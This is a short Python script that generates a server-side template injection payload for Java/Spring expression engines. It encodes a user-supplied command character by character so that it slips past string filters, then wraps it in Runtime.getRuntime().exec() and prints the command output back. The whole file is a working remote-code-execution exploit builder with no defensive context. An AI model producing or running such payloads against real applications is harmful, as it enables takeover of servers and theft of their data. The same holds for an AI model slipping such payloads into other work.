text = input("enter a string to convert into ascii values:")
ascii_values = []
ascii_values2 = []
text2=''
for character in text:
    ascii_values.append(ord(character))
    ascii_values2.append(ord(character))
#caprint(ascii_values)
ascii_values.pop(0)
ascii_values.pop(-1)
for value in ascii_values:
   text2+='toString('+ str(value) +')).concat(T(java.lang.Character).' 
#print(text2)
finalpayload='*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString('+str(ascii_values2[0])+').concat(T(java.lang.Character).'+ text2+'toString('+str(ascii_values2[-1])+'))).getInputStream())}'
print(finalpayload)